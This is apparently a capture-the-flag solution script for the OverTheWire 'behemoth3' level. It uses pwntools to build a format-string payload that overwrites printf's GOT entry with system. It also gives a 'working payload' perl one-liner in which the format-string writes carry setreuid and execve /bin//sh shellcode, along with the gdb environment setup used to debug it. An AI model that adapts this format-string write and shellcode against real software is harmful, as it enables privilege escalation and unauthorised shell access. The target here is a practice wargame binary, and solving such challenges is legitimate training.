from pwn import *

# oneShot = 0xf7e12000 + 0x5f7c5
oneShot = 0xf7e02000 + 0x03ada0 # local
system = 0xf7e3cda0
putsGot = 0x80497ac
printfGot = 0x80497a4

def exec_fmt(payload):
	p = process('./behemoth3')
	# p = remote('ctf.hackucf.org', 20008)
	p.sendline(payload)
	data = p.recvall()
	print data
	return data


# autofmt = FmtStr(exec_fmt)
# autofmt.write(logAddress, u32('flag'))
# autofmt.write(strstrGotAddress, printfPltAddress)
# autofmt.execute_writes()
# autofmt.write(putsGot, oneShot)
# autofmt.execute_writes()
payload = "AAAA"
payload += fmtstr_payload(1, {printfGot: system}, write_size='byte', numbwritten=4)
p = process('./behemoth3')
p.sendline(payload)
p.interactive()


debugging:
env -i PWD=`pwd` SHLVL=1 gdb /behemoth/behemoth3
gdb$ unset env LINES
gdb$ unset env COLUMNS

working payload:
perl -e 'print pack(l,0xffffde3c) . pack(l,0xffffde3c+2) . "\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80" . "%56660x%1\$hn%8839x%2\$hn"'

cat <(perl -e 'print pack(l,0xffffde3c) . pack(l,0xffffde3c+2) . "\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80" . "%56660x%1\$hn%8839x%2\$hn"') - | env -i PWD=`pwd` SHLVL=1 /behemoth/behemoth3